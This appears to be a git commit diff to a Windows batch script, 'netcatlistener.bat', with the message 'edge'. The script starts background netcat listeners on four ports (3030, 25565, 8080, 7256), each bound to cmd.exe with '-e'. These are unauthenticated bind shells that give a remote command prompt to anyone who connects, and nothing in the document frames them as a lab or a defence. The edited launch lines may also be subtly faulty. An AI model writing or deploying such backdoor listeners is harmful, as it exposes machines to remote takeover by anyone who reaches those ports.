a9c4588142169d4710c8bc462c81291244d2a78d
Dr-N0 <beckettjenen@gmail.com>
2023-11-18 17:42:41 -0500

    edge

--- WindowsXp/netcatlistener.bat
+++ WindowsXp/netcatlistener.bat
@@ -1,13 +1,11 @@
-@echo off
-
 REM Start a Netcat listener on port 3030 in the background
-START /B netcat-1.11\nc.exe -l -p 3030 -e cmd.exe
+START /B "%~dp0netcat-1.11\nc.exe" -l -p 3030 -e cmd.exe
 
 REM Start a Netcat listener on port 25565 in the background
-START /B netcat-1.11\nc.exe -l -p 25565 -e cmd.exe
+START /B "%~dp0netcat-1.11\nc.exe" -l -p 25565 -e cmd.exe
 
 REM Start a Netcat listener on port 8080 in the background
-START /B netcat-1.11\nc.exe -l -p 8080 -e cmd.exe
+START /B "%~dp0netcat-1.11\nc.exe" -l -p 8080 -e cmd.exe
 
 REM Start a Netcat listener on port 7256 in the background
-START /B netcat-1.11\nc.exe -l -p 7256 -e cmd.exe
+START /B "%~dp0netcat-1.11\nc.exe" -l -p 7256 -e cmd.exe
